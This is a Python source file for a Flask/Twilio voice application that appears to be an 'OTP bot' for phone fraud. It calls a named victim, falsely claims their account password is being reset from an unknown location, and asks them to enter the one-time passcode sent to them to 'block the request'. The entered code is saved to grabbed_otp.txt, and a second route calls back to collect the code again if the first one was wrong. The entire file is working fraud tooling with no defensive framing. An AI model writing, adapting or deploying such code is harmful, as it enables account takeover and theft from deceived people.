from twilio.twiml.voice_response import VoiceResponse, Gather, Play
from flask import Flask, request

app = Flask(__name__)

@app.route("/voice", methods=['GET', 'POST'])
def voice():
    # Start a TwiML response 
    resp = VoiceResponse()
    resp.say(f",,,Hello {open('Details/Client_Name.txt', 'r').read()}, your {open('Details/Company Name.txt', 'r').read()} account password is trying to be reset from unknow location,")
    gather = Gather(num_digits=1, action='/gather', timeout=120)
    gather.say('If this was not you please press 1,')
    resp.append(gather)

    return str(resp)


@app.route('/gather', methods=['GET', 'POST'])
def gather():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()

    # If Twilio's request to our app included already gathered digits,
    # process them
    if 'Digits' in request.values:
        # Get which digit the caller chose
        choice = request.values['Digits']

        # <Say> a different message depending on the caller's choice
        if choice == '1':
            gatherotp = Gather(num_digits=int(open("Details/Digits.txt", 'r').read()), action='/gatherotp', timeout=120)
            gatherotp.say(f'To block the request, Please enter the {open("Details/Digits.txt", "r").read()} digits code we sent to you, when you finish, Please press Pound')
            resp.append(gatherotp)
            return str(resp)

        else:
            # If the caller didn't choose 1 or 2, apologize and ask them again
            resp.say("Sorry, Please make currect choice.")
            resp.redirect('/voice')
            return str(resp)

    # If the user didn't choose 1 or 2 (or anything), send them back to /voice
    resp.redirect('/voice')

    return str(resp)

@app.route('/gatherotp', methods=['GET', 'POST'])
def gatherotp():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()

    # If Twilio's request to our app included already gathered digits,
    # process them
    resp.say('Please give us a moment to block the request')
    if 'Digits' in request.values:
        # Get which digit the caller chose
        resp.play(url='https://ia904701.us.archive.org/33/items/music_20221124/music.mp3')
        resp.say('Great, we have blocked the request. However, If you accidently type wrong one time passcode, We will call you again,')
        a = open('grabbed_otp.txt', 'w', encoding='utf-8')
        choice1 = request.values['Digits']
        a.write(choice1)
        return str(resp)

    
    else:
        # If the caller didn't choose 1 or 2, apologize and ask them again
        resp.say("Sorry, Please make currect choice.")
        resp.redirect('/gather')
        return str(resp)

@app.route("/voiceagain", methods=['GET', 'POST'])
def voiceagain():
    # Start a TwiML response
    resp = VoiceResponse()
    resp.say(f"Hello {open('Details/Client_Name.txt', 'r').read()}, Sorry, you have type wrong one time passcode,")
    gather = Gather(num_digits=1, action='/gather', timeout=120)
    gather.say('Press 1, To enter the one time passcode again')
    resp.append(gather)

    return str(resp)

if __name__ == "__main__":
    app.run(debug=True)
